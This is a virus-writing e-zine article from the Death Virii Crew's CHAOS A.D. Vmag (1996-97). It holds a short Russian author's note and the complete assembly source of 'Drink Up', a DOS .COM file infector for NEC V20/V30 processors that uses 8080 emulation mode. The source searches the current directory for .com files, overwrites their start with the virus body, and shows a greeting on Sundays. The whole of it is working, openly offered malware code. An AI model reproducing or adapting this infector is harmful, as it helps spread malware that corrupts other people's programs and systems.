comment {

[Death Virii Crew] Presents
CHAOS A.D. Vmag, Issue 3, Autumn 1996 - Winter 1997


			       Drink Up 


Этот вирус был написан мной в состоянии крайней нетрезвости и посему
название получил соответствующее. Что меня больше всего удивило на 
следующий день, так это то, что большую часть вируса занимает проверка
достоверности надписи, вывод характерной строчки, при ее недостоверности,
вывод самой подписи и проверка когда ее собственно выводить ;))) 
Видать ну очень мне хотелось поздравить народ с праздниками :))))
А вирь полный примитив, еще тот нерезидент из текущей директории. Зато 
на каком асме !!! :)) Я даже почти не забыл Радио 86 РК ;))) Хотя нет, гоню
забыл. ну разве можно так писать ? :) Короче основной прикол в том, что 
исполняться будет сей вирь исключительно на nec'ах. А на нет и посылает
куда положено. на выход ;). А и еще, взглянув на hex-дамп сего чуда
только ненормальный подумает, что это может быть кодом. ;)))))
Празднуйте хорошо. Пейте больше. Пишите лучше. И взгляните вокруг хоть
чуточку веселее ;)))))
{
;===========================================================================
.model tiny
.code
org 100h
start:
mov cx,3

; check nec20/30
db 0f3h,26h,0ach	; rep es: lodsb
or cx,cx
jnz fuck

include asm_8080.inc
include nec_20_u.inc

mov ax,2577h
lea dx,entry
int 21h

mov ax,2588h
lea dx,entry21
int 21h

cli
brkem 77h
sti
;								int 3
push bx

xchg dx,si		; si <- de
xchg di,bx		; di <- hl
cld

mov ax,0f0h
push ax

fuck:
ret

entry:

_lxi_sp 0f000h

; check my mess

_lxi_b mess
_mvi_h len_mess
_lxi_d 0

@check:
_ldax_b

_mov_l_a

_add_d 
_mov_d_a

_mov_a_l
_add_e
_rlc
_mov_e_a

_inx_b

_dcr_h 
_jnz @check
;								retem
_mvi_a 0A8h
_cmp_d
_jnz _lmd

_mvi_a 54h
_cmp_e
_jz _ok

_lmd:
; ----- LMD

_lxi_b buf+3

_mvi_a '$'
_stax_b
_dcx_b

_mvi_a 'D'
_stax_b
_dcx_b

_mvi_a 'M'
_stax_b
_dcx_b

_mvi_a 'L'
_stax_b

_sux:
int21h 900h,0,buf
_jmp _sux

; ----- LMD

; check my mess

_ok:

_lhld len_of_infected_program
_push_h

;----------------------- 1 -------------- save dta  ---
; b -> d
_lxi_b 80h
_lxi_d buf1
_mvi_h 100
@work:
_ldax_b
_stax_d
	_inx_b
	_inx_d
_dcr_h
_jnz @work 
;----------------------- 2 -------------- movsb dta 2 buf ---

int21h 4e00h,20h,fmask
find:
_jc quit


_lxi_h 9ah+1	; len (hi byte)
_mov_a_m
_cpi 0EEh	; > ~61000
_jnc next
_cpi 3		; < ~700
_jc next

int21h 3d02h,0,9eh
_jc next

_xchg		; hl <-> de : xchg 	aka xchg bx,dx		

int21h 3f00h,len,buf
_jc next

_lxi_b buf
_ldax_b
_cpi 0b9h
_jz next
_cpi 'Z'
_jz next
_cpi 'M'
_jnz @1

next:
int21h 3e00h,0,0
int21h 4f00h,0,0
_jmp find

len_of_infected_program dw len

@1:
int21h 4202h,0,0
_jc next

; de - len
_xchg	; de(dx) <-> hl(bx) 
_shld len_of_infected_program
_xchg 	; de(dx) <->  hl(bx)

int21h 4000h,len,buf
_jc next

int21h 4200h,0,0,
_jc next
int21h 4000h,len,100h
_jc next

quit:

;++++++++++++++++++++++++++++++++
int21h 2a00h,0,0

_mvi_a 0	; sunday 
_cmp_e
_jnz @quit2

int21h 900h,0,mess

@quit2:
;++++++++++++++++++++++++++++++++

;----restore dta ------

_lxi_b buf1
_lxi_d 80h
_mvi_h 100

@work2:
_ldax_b
_stax_d
	_inx_b
	_inx_d
	
_dcr_h
_jnz @work2

;-------------------------

_lxi_h 0a4f3h
_shld 0f0h
_lxi_h 0c390h
_shld 0f2h


perl:

_pop_h
_lxi_d 100h
_dad_d
_xchg 		; hl(bx)->di = 100h ; de(dx)->si = infected+100h
_lxi_b len	; bc(cx) = len

retem

entry21:
cli
push si
mov si,sp
mov sp,bp
pop dx cx ax
mov bp,sp
mov sp,si
pop si
sti
int 21h
xchg ax,dx
pop ax ds
pop cx	; skip old flags
pushf
pop cx
and cx,7fffh		; clear md flag
push cx
push ds ax
iret

fmask db '*.com',0
mess db '[Drink Up] by Reminder',0dh,0ah
     db 'Greetings: SGWW, DVC, FotD, SOS group, TAVC, CiD',0dh,0ah,'$'
len_mess equ $-mess
buf equ 0f000h		       
buf1 equ 0fffeh-400
len equ $-start		       
ret 			       
end start
;===========================================================================

						(c) by Reminder [DVC]

